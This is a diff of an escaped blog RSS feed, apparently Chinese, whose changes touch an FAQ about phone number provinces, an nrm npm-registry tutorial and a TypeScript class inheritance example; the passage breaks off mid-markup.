+&lt;ol start=&#34;8&#34;&gt;
+&lt;li&gt;&lt;strong&gt;归属地不是本省的影响流量和通话吗？&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;💔本文讲的都是全国流量，三大运营商也早就取消了通话漫游费，所以归属地不是本省不会有影响的。&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -164,7 +790,7 @@
 &lt;p&gt;我们通过  &lt;code&gt;nrm ls&lt;/code&gt;  查看目前可用的源后，需要切换到某个源，直接使用  &lt;code&gt;nrm use &amp;lt;源名&amp;gt;&lt;/code&gt;  即可完成切换。比如我们需要切换到 taobao 的源直接使用  &lt;code&gt;nrm use taobao&lt;/code&gt; &lt;br /&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/iDqWpIURM9n2AuC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;3增加源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3增加源&#34;&gt;#&lt;/a&gt; 3. 增加源&lt;/h2&gt;
-&lt;p&gt;有时我们需要增加一些定制的源，如公司内部自己的私有源，我们使用  &lt;code&gt;nrm add &amp;lt;源名&amp;gt; &amp;lt;源 url&amp;gt;&lt;/code&gt;  进行添加。&lt;br /&gt;
+&lt;p&gt;有时我们需要增加一些定制的源，如公司内部自己的私有源，我们使用  &lt;code&gt;nrm add &amp;lt;源名&amp;gt; &amp;lt;源 url&amp;gt;&lt;/code&gt;   进行添加。&lt;br /&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/uvs76ydPr1eiQEW.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;4删除源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4删除源&#34;&gt;#&lt;/a&gt; 4. 删除源&lt;/h2&gt;
 &lt;p&gt;删除不需要的源使用  &lt;code&gt;nrm del &amp;lt;源名&amp;gt;&lt;/code&gt;  进行删除&lt;br /&gt;
@@ -268,7 +894,7 @@ mac 下的&lt;br /&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/7qfzeILgmMy435s.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;继承&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#继承&#34;&gt;#&lt;/a&gt; 继承&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/MkJVPURgiZKHaxs.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight ts&#34;&gt;&lt;figcaption data-lang=&#34;TypeScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 继承 inheritance 即类中共同的属性 防止重复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; firstName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; lastName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 注意这里不能 return 任何 因为要返回一个实例对象 object 类型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fullName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;firstName &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lastName&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;walk&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Walking&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Student&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; studentId&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;number&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; firstName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; lastName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 这里使用访问修饰符时：public /private 我们本质上是在创建一个参数属性 所以类型脚本编译器将创建此名称的属性并为我们初始化它 这里我们不想用公共修饰符 public 因为之前已经在 Person 里声明且初始化过了&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;firstName&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; lastName&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 在 ts 中 有一个特殊的关键字 super 去让我们来参考 reference 基础的类 basic class&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;takeTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Taking a test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; student &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Student&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;John&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;john@gmail.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;折叠代码块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#折叠代码块&#34;&gt;#&lt;/a&gt; 折叠代码块&lt;/h3&gt;
+&lt;figure class=&#34;highlight ts&#34;&gt;&lt;figcaption data-lang=&#34;TypeScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 继承 inheritance 即类中共同的属性 防止重复&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; firstName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; lastName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 注意这里不能 return 任何 因为要返回一个实例对象 object 类型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fullName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;firstName &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lastName&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;walk&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Walking&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Student&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; studentId&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;number&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; firstName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; lastName&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 这里使用访问修饰符时：public /private 我们本质上是在创建一个参数属性 所以类型脚本编译器将创建此名称的属性并为我们初始化它 这里我们不想用公共修饰符 public 因为之前已经在 Person 里声明且初始化过了&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;firstName&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; lastName&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 在 ts 中 有一个特殊的关键字 super 去让我们来参考 reference 基础的类 basic class&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 